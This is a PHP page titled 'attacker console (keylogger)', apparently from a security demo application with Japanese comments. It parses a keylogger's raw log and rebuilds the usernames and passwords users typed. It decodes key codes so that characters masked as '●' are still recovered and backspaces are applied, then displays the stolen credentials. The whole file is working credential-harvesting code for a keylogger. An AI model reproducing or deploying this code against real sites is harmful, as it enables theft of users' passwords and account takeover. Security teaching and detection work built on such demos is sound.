<?php
// attacker_console.php
// キーロガーの生ログ（logs/keylogger.log）から username / password を復元して見やすく表示

if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}

// 管理者のみ閲覧可能（必要なら権限条件を調整）
if (!isset($_SESSION['role']) || $_SESSION['role'] !== 'admin') {
    header('Location: list.php');
    exit;
}

// キーロガーが有効でなければダッシュボードへ
if (empty($_SESSION['keylogger_enabled'])) {
    header('Location: ids_dashboard.php?error=' . urlencode('キーロガーは現在オフです'));
    exit;
}

$log_file = __DIR__ . '/logs/keylogger.log';
$events   = [];

// ログ1行をパースして [ts, field, code, key] を返す
function parse_keylog_line(string $line): ?array {
    // 例:
    // [2025-08-25 02:32:25] field=password code=KeyN key=●
    // [2025-08-25 02:31:59] field=username code=KeyN key=n
    $re = '/^\[(.*?)\]\s+field=([A-Za-z0-9_\-]+)\s+code=([^\s]+)\s+key=(.*)$/u';
    if (preg_match($re, $line, $m)) {
        return [
            'ts'    => trim($m[1]),
            'field' => trim($m[2]),
            'code'  => trim($m[3]),
            'key'   => trim($m[4]),
        ];
    }
    return null;
}

// KeyboardEvent.code から実際の1文字へ（英数・記号を中心に簡易対応）
function map_code_to_char(string $code): ?string {
    // A-Z
    if (preg_match('/^Key([A-Z])$/', $code, $m)) {
        return strtolower($m[1]);
    }
    // 0-9
    if (preg_match('/^Digit([0-9])$/', $code, $m)) {
        return $m[1];
    }

    // よく使う記号
    $map = [
        'Space'        => ' ',
        'Minus'        => '-',
        'Equal'        => '=',
        'Comma'        => ',',
        'Period'       => '.',
        'Slash'        => '/',
        'Backquote'    => '`',
        'BracketLeft'  => '[',
        'BracketRight' => ']',
        'Semicolon'    => ';',
        'Quote'        => "'",
        'Backslash'    => '\\',
    ];
    if (isset($map[$code])) return $map[$code];

    // バックスペース等は null（別処理）
    if (in_array($code, ['Backspace', 'Enter', 'Tab', 'Escape'], true)) {
        return null;
    }

    // 不明
    return null;
}

// 復元処理
$fields = [];   // 各フィールドの文字列復元バッファ
$raw    = [];   // 生イベント（表で表示用）

if (file_exists($log_file)) {
    // 大きくなりがちなので最後の N 行のみ読む（必要に応じて調整）
    $max_lines = 2000;
    $lines = @file($log_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines === false) $lines = [];
    if (count($lines) > $max_lines) {
        $lines = array_slice($lines, -$max_lines);
    }

    foreach ($lines as $line) {
        $ev = parse_keylog_line($line);
        if (!$ev) continue;

        $raw[] = $ev;

        $fname = $ev['field'];
        $code  = $ev['code'];
        $key   = $ev['key'];

        if (!isset($fields[$fname])) $fields[$fname] = '';

        // 特殊キー
        if ($code === 'Backspace') {
            // 1文字削除
            $fields[$fname] = mb_substr($fields[$fname], 0, mb_strlen($fields[$fname]) - 1);
            continue;
        }
        if ($code === 'Enter' || $code === 'Tab' || $code === 'Escape') {
            continue;
        }

        // code 優先で文字に変換（key がマスクされていても復元）
        $ch = map_code_to_char($code);

        // code でマップできない場合は key を利用（1文字かつ「●」以外なら採用）
        if ($ch === null) {
            // key が1文字で、かつ「●」でない場合のみ採用
            if (mb_strlen($key) === 1 && $key !== '●') {
                $ch = $key;
            }
        }

        if ($ch !== null) {
            $fields[$fname] .= $ch;
        }
    }
}

// 表示用の最終値
$current_username = $fields['username'] ?? '';
$current_password = $fields['password'] ?? '';

?>
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>攻撃者コンソール（Keylogger）</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; }
        .card { background:#fff; border-radius:0.75rem; box-shadow:0 4px 12px rgba(0,0,0,.06); }
        .pill  { padding:.25rem .5rem; border-radius:9999px; font-size:.75rem; }
    </style>
</head>
<body class="bg-gray-100">
<?php include __DIR__ . '/header.php'; ?>
<div class="container mx-auto mt-8 p-4 max-w-5xl">

    <div class="flex items-center justify-between mb-4">
        <h1 class="text-2xl font-bold text-gray-800">攻撃者コンソール（Keylogger）</h1>
        <div class="pill bg-yellow-100 text-yellow-800">Keylogger: <?= !empty($_SESSION['keylogger_enabled']) ? '有効' : '無効' ?></div>
    </div>

    <!-- 復元結果の要約 -->
    <div class="card p-6 mb-6">
        <h2 class="text-lg font-semibold mb-3">直近の入力から復元した資格情報</h2>
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mono text-sm">
            <div class="bg-gray-50 border rounded p-3">
                <div class="text-gray-500">username</div>
                <div class="text-lg"><?= htmlspecialchars($current_username) !== '' ? htmlspecialchars($current_username) : '<span class="text-gray-400">（未取得）</span>' ?></div>
            </div>
            <div class="bg-gray-50 border rounded p-3">
                <div class="text-gray-500">password</div>
                <div class="text-lg"><?= htmlspecialchars($current_password) !== '' ? htmlspecialchars($current_password) : '<span class="text-gray-400">（未取得）</span>' ?></div>
            </div>
        </div>

        <?php if ($current_username !== '' || $current_password !== ''): ?>
            <div class="mt-4">
                <div class="text-sm text-gray-600">まとめ表示</div>
                <div class="mono bg-black text-green-400 p-3 rounded">
                    username=<?= htmlspecialchars($current_username) ?>  password=<?= htmlspecialchars($current_password) ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <!-- 生ログ（最新が上） -->
    <div class="card p-6">
        <div class="flex items-center justify-between mb-3">
            <h2 class="text-lg font-semibold">生イベントログ</h2>
            <form method="post" action="clear_keylogger.php" onsubmit="return confirm('keyloggerログをクリアしますか？');">
                <button type="submit" class="text-sm bg-red-50 text-red-700 border border-red-300 px-3 py-1 rounded hover:bg-red-100">ログをクリア</button>
            </form>
        </div>
        <div class="overflow-x-auto">
            <table class="min-w-full leading-normal text-sm mono">
                <thead>
                    <tr>
                        <th class="px-3 py-2 bg-gray-100 border-b text-left">時刻</th>
                        <th class="px-3 py-2 bg-gray-100 border-b text-left">field</th>
                        <th class="px-3 py-2 bg-gray-100 border-b text-left">code</th>
                        <th class="px-3 py-2 bg-gray-100 border-b text-left">key</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if (!empty($raw)): ?>
                        <?php foreach (array_reverse($raw) as $e): ?>
                            <tr class="hover:bg-gray-50">
                                <td class="px-3 py-2 border-b"><?= htmlspecialchars($e['ts']) ?></td>
                                <td class="px-3 py-2 border-b"><?= htmlspecialchars($e['field']) ?></td>
                                <td class="px-3 py-2 border-b"><?= htmlspecialchars($e['code']) ?></td>
                                <td class="px-3 py-2 border-b"><?= htmlspecialchars($e['key']) ?></td>
                            </tr>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <tr><td colspan="4" class="px-3 py-6 text-center text-gray-500">keyloggerログはまだありません。</td></tr>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
        <p class="mt-3 text-xs text-gray-500">※ 復元は英数・一部記号とBackspaceに対応。日本語IME・特殊キーは簡易対応です。</p>
    </div>

</div>
</body>
</html>
